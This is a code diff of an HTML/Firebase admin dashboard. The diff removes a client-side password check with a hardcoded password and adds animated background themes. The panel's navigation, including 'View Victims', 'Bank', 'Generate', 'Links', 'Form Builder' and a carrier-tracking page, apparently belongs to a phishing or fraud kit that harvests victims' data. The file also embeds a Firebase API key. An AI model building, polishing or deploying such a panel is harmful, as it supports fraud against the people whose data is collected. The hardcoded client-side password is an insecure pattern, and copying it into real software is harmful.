@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en" >
+<html lang="en">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
@@ -8,222 +8,148 @@
   <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-auth-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore-compat.js"></script>
   <style>
-    /* Reset & basics */
-    body, html {
-      margin: 0; padding: 0; height: 100%; font-family: Arial, sans-serif; 
-      overflow: hidden;
-    }
-
-    /* Background container with image & animated gradient overlay */
-    #background {
-      position: fixed;
-      top: 0; left: 0; right: 0; bottom: 0;
-      background-size: cover;
-      background-position: center center;
-      z-index: -2;
-    }
-
-    #animatedGradient {
-      position: fixed;
-      top: 0; left: 0; right: 0; bottom: 0;
-      background: linear-gradient(-45deg, #0d0d0d, #222222, #000000, #333333);
-      background-size: 400% 400%;
-      animation: gradientShift 15s ease infinite;
-      opacity: 0.5;
-      z-index: -1;
-      pointer-events: none;
-    }
-
-    @keyframes gradientShift {
-      0% {background-position: 0% 50%;}
-      50% {background-position: 100% 50%;}
-      100% {background-position: 0% 50%;}
-    }
-
-    /* Password form styling */
-    #passwordSection {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
-      background: rgba(0,0,0,0.8);
+    body {
+      margin: 0; 
+      font-family: Arial, sans-serif; 
+      background: #222; /* default dark */
       color: white;
-      z-index: 10;
+      transition: background 0.5s ease;
       position: relative;
+      min-height: 100vh;
     }
-
-    #passwordSection input {
-      font-size: 1.2rem;
-      padding: 10px;
-      margin-top: 10px;
-      width: 280px;
-      border-radius: 5px;
-      border: none;
-    }
-
-    #passwordSection button {
-      margin-top: 15px;
-      padding: 10px 25px;
-      font-size: 1.1rem;
-      border-radius: 5px;
-      border: none;
-      cursor: pointer;
-      background-color: #555;
-      color: white;
-      transition: background-color 0.3s ease;
-    }
-    #passwordSection button:hover {
-      background-color: #777;
-    }
-
-    #passwordError {
-      color: #f44336;
-      margin-top: 10px;
-      height: 18px;
-    }
-
-    /* Admin content styling */
-    #adminContent {
-      display: none;
-      height: 100vh;
-      overflow: hidden;
-      display: flex;
-      flex-direction: column;
-      background: rgba(255 255 255 / 0.85);
-      box-shadow: 0 0 40px rgba(0,0,0,0.3);
-    }
-
     .header {
-      background: #222;
-      color: #fff;
-      padding: 10px;
-      text-align: center;
-      display: flex;
-      align-items: center;
-      justify-content: center;
+      background: #222; 
+      color: #fff; 
+      padding: 10px; 
+      text-align: center; 
+      display: flex; 
+      align-items: center; 
+      justify-content: center; 
       gap: 15px;
-      flex-shrink: 0;
+      position: relative;
+      z-index: 10;
     }
     .header img {
       height: 50px;
-      border-radius: 6px;
-      object-fit: contain;
     }
-
-    .nav {
+    .bg-theme-wrapper {
       background: #333;
-      display: flex;
-      flex-wrap: wrap;
-      justify-content: center;
-      gap: 10px;
       padding: 10px;
-      flex-shrink: 0;
+      text-align: center;
+      z-index: 10;
+      position: relative;
+    }
+    label {
+      font-weight: bold;
+      margin-right: 8px;
+      user-select: none;
+    }
+    select {
+      padding: 5px; 
+      border-radius: 4px; 
+      border: none;
+      background: #555;
+      color: white;
+      font-size: 1rem;
+      cursor: pointer;
+    }
+    #bgInput {
+      margin-left: 10px;
+      vertical-align: middle;
+    }
+    .nav {
+      background: #333; 
+      display: flex; 
+      flex-wrap: wrap; 
+      justify-content: center; 
+      gap: 10px; 
+      padding: 10px;
+      position: relative;
+      z-index: 10;
     }
     .nav a {
-      color: white;
-      text-decoration: none;
-      font-weight: bold;
-      background: #444;
-      padding: 8px 15px;
+      color: white; 
+      text-decoration: none; 
+      font-weight: bold; 
+      background: #444; 
+      padding: 8px 15px; 
       border-radius: 5px;
       user-select: none;
-      transition: background-color 0.2s ease;
     }
     .nav a:hover {
       background: #555;
     }
-
-    .logo-upload, .bg-upload {
-      background: #fff;
-      padding: 10px;
-      text-align: center;
-      border-top: 1px solid #ccc;
-      flex-shrink: 0;
-    }
-
     iframe {
-      flex-grow: 1;
+      width: 100%; 
+      height: 80vh; 
       border: none;
-      width: 100%;
-      height: 100%;
+      position: relative;
+      z-index: 5;
+    }
+    .logo-upload {
+      background: #fff; 
+      padding: 10px; 
+      text-align: center;
+      color: #222;
+      position: relative;
+      z-index: 10;
     }
 
+    /* Gradient animation */
+    @keyframes gradientBG {
+      0% {background-position:0% 50%}
+      50% {background-position:100% 50%}
+      100% {background-position:0% 50%}
+    }
+    /* Canvas covers entire background */
+    #bgCanvas {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100vw; height: 100vh;
+      z-index: 0;
+      pointer-events: none;
+    }
   </style>
 </head>
 <body>
-
-  <!-- Background containers -->
-  <div id="background"></div>
-  <div id="animatedGradient"></div>
-
-  <!-- Password prompt -->
-  <div id="passwordSection">
-    <h2>Enter Admin Password</h2>
-    <input type="password" id="passwordInput" placeholder="Password" autocomplete="off" />
-    <button id="submitPassword">Submit</button>
-    <div id="passwordError"></div>
+  <div class="header">
+    <img id="dashboardLogo" src="logo.png" alt="Logo" />
+    <h1>Admin Dashboard</h1>
   </div>
 
-  <!-- Admin dashboard content -->
-  <div id="adminContent">
-    <div class="header">
-      <img id="dashboardLogo" src="logo.png" alt="Logo" />
-      <h1>Admin Dashboard</h1>
-    </div>
-
-    <div class="nav">
-      <a href="#" onclick="loadPage('form-builder')">🎨 Form Builder</a>
-      <a href="#" onclick="loadPage('forms')">💾 Saved Forms</a>
-      <a href="#" onclick="loadPage('feedback')">📝 Feedback</a>
-      <a href="#" onclick="loadPage('victims')">🧠 View Victims</a>
-      <a href="#" onclick="loadPage('members')">👥 Members</a>
-      <a href="#" onclick="loadPage('links')">🔗 Links</a>
-      <a href="#" onclick="loadPage('generate')">🧾 Generate</a>
-      <a href="#" onclick="loadPage('bank')">🏦 Bank</a>
-      <a href="#" onclick="loadPage('tracking')">📦 Tracking (Carrier Federal)</a>
-    </div>
-
-    <div class="logo-upload">
-      <h3>📷 Change Platform Logo (Admin Only)</h3>
-      <input type="file" id="logoInput" accept="image/*" />
-    </div>
-
-    <div class="bg-upload">
-      <h3>🖼️ Change Background Image</h3>
-      <input type="file" id="bgInput" accept="image/*" />
-      <button id="clearBg" style="margin-top:8px; cursor:pointer;">Clear Background</button>
-    </div>
-
-    <iframe id="iframePage" src="Social-media-links/build.html"></iframe>
+  <div class="bg-theme-wrapper">
+    <label for="bgThemeSelect">🖼️ Change Background:</label>
+    <select id="bgThemeSelect">
+      <option value="none">None</option>
+      <option value="gradient">Animated Gradient</option>
+      <option value="stars">Starfield</option>
+      <option value="waves">Waves</option>
+      <option value="circles">Moving Circles</option>
+      <option value="custom">Custom Upload</option>
+    </select>
+    <input type="file" id="bgInput" accept="image/*" style="display:none;" />
   </div>
+
+  <div class="nav">
+    <a href="#" onclick="loadPage('form-builder')">🎨 Form Builder</a>
+    <a href="#" onclick="loadPage('forms')">💾 Saved Forms</a>
+    <a href="#" onclick="loadPage('feedback')">📝 Feedback</a>
+    <a href="#" onclick="loadPage('victims')">🧠 View Victims</a>
+    <a href="#" onclick="loadPage('members')">👥 Members</a>
+    <a href="#" onclick="loadPage('links')">🔗 Links</a>
+    <a href="#" onclick="loadPage('generate')">🧾 Generate</a>
+    <a href="#" onclick="loadPage('bank')">🏦 Bank</a>
+    <a href="#" onclick="loadPage('tracking')">📦 Tracking (Carrier Federal)</a>
+  </div>
+
+  <div class="logo-upload">
+    <h3>📷 Change Platform Logo (Admin Only)</h3>
+    <input type="file" id="logoInput" accept="image/*" />
+  </div>
+
+  <iframe id="iframePage" src="Social-media-links/build.html"></iframe>
 
   <script>
-    const PASSWORD = "Forgetme1";
-
-    const passwordSection = document.getElementById("passwordSection");
-    const adminContent = document.getElementById("adminContent");
-    const passwordInput = document.getElementById("passwordInput");
-    const submitPassword = document.getElementById("submitPassword");
-    const passwordError = document.getElementById("passwordError");
-
-    submitPassword.addEventListener("click", () => {
-      if (passwordInput.value === PASSWORD) {
-        passwordSection.style.display = "none";
-        adminContent.style.display = "flex";
-      } else {
-        passwordError.textContent = "Incorrect password. Please try again.";
-        passwordInput.value = "";
-        passwordInput.focus();
-      }
-    });
-
-    passwordInput.addEventListener("keydown", (e) => {
-      if (e.key === "Enter") {
-        submitPassword.click();
-      }
-    });
-
     // Firebase config and initialization
     const firebaseConfig = {
       apiKey: "AIzaSyB5zWUvl64s6wAjjeXd0mCUyhMEdzg_MmM",
@@ -242,6 +168,7 @@
         window.location.href = "login.html";
         return;
       }
+
       try {
         const docSnap = await db.collection("users").doc(user.uid).get();
         if (!docSnap.exists) {
@@ -249,8 +176,9 @@
           return auth.signOut();
         }
         const userData = docSnap.data();
+
         if (userData.role !== "admin") {
-          window.location.href = "dashboard.html";
+          return window.location.href = "dashboard.html";
         }
       } catch (err) {
         console.error(err);
@@ -261,68 +189,193 @@
 
     function loadPage(page) {
       const iframe = document.getElementById("iframePage");
-      if (page === "form-builder") iframe.src = base + "build.html";
-      else if (page === "forms") iframe.src = base + "forms.html";
-      else if (page === "feedback") iframe.src = base + "feedback.html";
-      else if (page === "victims") iframe.src = base + "victims.html";
-      else if (page === "members") iframe.src = base + "members.html";
-      else if (page === "links") iframe.src = base + "links.html";
-      else if (page === "generate") iframe.src = base + "generate.html";
-      else if (page === "bank") iframe.src = base + "bank.html";
-      else if (page === "tracking") iframe.src = base + "tracking.html";
+      const pages = {
+        'form-builder': "build.html",
+        'forms': "forms.html",
+        'feedback': "feedback.html",
+        'victims': "victims.html",
+        'members': "members.html",
+        'links': "links.html",
+        'generate': "generate.html",
+        'bank': "bank.html",
+        'tracking': "tracking.html"
+      };
+      iframe.src = base + (pages[page] || "build.html");
     }
 
-    // Logo upload and save
-    const logoInput = document.getElementById("logoInput");
-    const dashboardLogo = document.getElementById("dashboardLogo");
+    // Logo upload & persist
+    const logoInput = document.getElementById('logoInput');
+    const dashboardLogo = document.getElementById('dashboardLogo');
 
-    logoInput.addEventListener("change", function (e) {
+    logoInput.addEventListener('change', function (e) {
       const file = e.target.files[0];
       if (file) {
         const reader = new FileReader();
         reader.onload = function (event) {
           const logoURL = event.target.result;
           dashboardLogo.src = logoURL;
-          localStorage.setItem("platformLogo", logoURL);
+          localStorage.setItem('platformLogo', logoURL);
         };
         reader.readAsDataURL(file);
       }
     });
 
-    // Load saved logo on page load
-    const savedLogo = localStorage.getItem("platformLogo");
+    const savedLogo = localStorage.getItem('platformLogo');
     if (savedLogo) {
       dashboardLogo.src = savedLogo;
     }
 
-    // Background image upload and save
-    const bgInput = document.getElementById("bgInput");
-    const backgroundDiv = document.getElementById("background");
-    const clearBgButton = document.getElementById("clearBg");
+    // Background themes
+    const bgThemeSelect = document.getElementById('bgThemeSelect');
+    const bgInput = document.getElementById('bgInput');
 
-    bgInput.addEventListener("change", function (e) {
-      const file = e.target.files[0];
-      if (!file) return;
-
-      const reader = new FileReader();
-      reader.onload = function (event) {
-        const bgURL = event.target.result;
-        backgroundDiv.style.backgroundImage = `url('${bgURL}')`;
-        localStorage.setItem("adminBackground", bgURL);
-      };
-      reader.readAsDataURL(file);
-    });
-
-    clearBgButton.addEventListener("click", () => {
-      backgroundDiv.style.backgroundImage = "";
-      localStorage.removeItem("adminBackground");
-    });
-
-    // Load saved background image on page load
-    const savedBg = localStorage.getItem("adminBackground");
-    if (savedBg) {
-      backgroundDiv.style.backgroundImage = `url('${savedBg}')`;
+    function clearBackground() {
+      document.body.style.background = '';
+      document.body.style.backgroundImage = '';
+      document.body.style.animation = '';
+      // Remove canvas if exists
+      const canvas = document.getElementById('bgCanvas');
+      if (canvas) canvas.remove();
     }
+
+    function createStarsBackground() {
+      if (document.getElementById('bgCanvas')) return;
+
+      const canvas = document.createElement('canvas');
+      canvas.id = 'bgCanvas';
+      canvas.width = window.innerWidth;
+      canvas.height = window.innerHeight;
+      canvas.style.position = 'fixed';
+      canvas.style.top = 0;
+      canvas.style.left = 0;
+      canvas.style.width = '100vw';
+      canvas.style.height = '100vh';
+      canvas.style.zIndex = '0';
+      canvas.style.pointerEvents = 'none';
+
+      document.body.appendChild(canvas);
+
+      const ctx = canvas.getContext('2d');
+      const stars = [];
+      const starCount = 120;
+
+      function randomRange(min, max) {
+        return Math.random() * (max - min) + min;
+      }
+
+      for (let i = 0; i < starCount; i++) {
+        stars.push({
+          x: Math.random() * canvas.width,
+          y: Math.random() * canvas.height,
+          radius: randomRange(0.5, 1.5),
+          alpha: Math.random(),
+          alphaChange: 0.01 + Math.random() * 0.02,
+        });
+      }
+
+      function animate() {
+        ctx.clearRect(0, 0, canvas.width, canvas.height);
+        stars.forEach((star) => {
+          star.alpha += star.alphaChange;
+          if (star.alpha <= 0 || star.alpha >= 1) star.alphaChange *= -1;
+
+          ctx.beginPath();
+          ctx.arc(star.x, star.y, star.radius, 0, Math.PI * 2);
+          ctx.fillStyle = `rgba(255,255,255,${star.alpha})`;
+          ctx.fill();
+        });
+        requestAnimationFrame(animate);
+      }
+      animate();
+
+      window.addEventListener('resize', () => {
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+      });
+    }
+
+    // Placeholder for waves or circles — you can add your animations here
+    function createWavesBackground() {
+      // Not implemented yet
+    }
+    function createCirclesBackground() {
+      // Not implemented yet
+    }
+
+    function applyBackgroundTheme(theme) {
+      clearBackground();
+      bgInput.style.display = 'none';
+
+      switch (theme) {
+        case 'gradient':
+          document.body.style.background = "linear-gradient(-45deg, #ee7752, #e73c7e, #23d5ab, #23a6d5)";
+          document.body.style.backgroundSize = "400% 400%";
+          document.body.style.animation = "gradientBG 15s ease infinite";
+          break;
+        case 'stars':
+          createStarsBackground();
+          break;
+        case 'waves':
+          createWavesBackground();
+          break;
+        case 'circles':
+          createCirclesBackground();
+          break;
+        case 'custom':
+          bgInput.style.display = 'inline-block';
+          const savedCustomBg = localStorage.getItem('adminBackground');
+          if (savedCustomBg) {
+            document.body.style.backgroundImage = `url(${savedCustomBg})`;
+            document.body.style.backgroundSize = "cover";
+            document.body.style.backgroundRepeat = "no-repeat";
+            document.body.style.backgroundPosition = "center";
+          }
+          break;
+        case 'none':
+        default:
+          document.body.style.background = '#222';
+          break;
+      }
+    }
+
+    // Animate gradient keyframes added dynamically above in CSS block
+
+    bgThemeSelect.addEventListener('change', e => {
+      const theme = e.target.value;
+      localStorage.setItem('bgTheme', theme);
+      applyBackgroundTheme(theme);
+      if (theme !== 'custom') {
+        localStorage.removeItem('adminBackground');
+      }
+    });
+
+    bgInput.addEventListener('change', e => {
+      const file = e.target.files[0];
+      if (file) {
+        const reader = new FileReader();
+        reader.onload = event => {
+          const dataUrl = event.target.result;
+          localStorage.setItem('adminBackground', dataUrl);
+          document.body.style.backgroundImage = `url(${dataUrl})`;
+          document.body.style.backgroundSize = "cover";
+          document.body.style.backgroundRepeat = "no-repeat";
+          document.body.style.backgroundPosition = "center";
+        };
+        reader.readAsDataURL(file);
+      }
+    });
+
+    // On page load, apply saved theme
+    window.addEventListener('load', () => {
+      const savedTheme = localStorage.getItem('bgTheme') || 'gradient';
+      bgThemeSelect.value = savedTheme;
+      applyBackgroundTheme(savedTheme);
+
+      const savedLogo = localStorage.getItem('platformLogo');
+      if (savedLogo) {
+        dashboardLogo.src = savedLogo;
+      }
+    });
   </script>
 </body>
 </html>
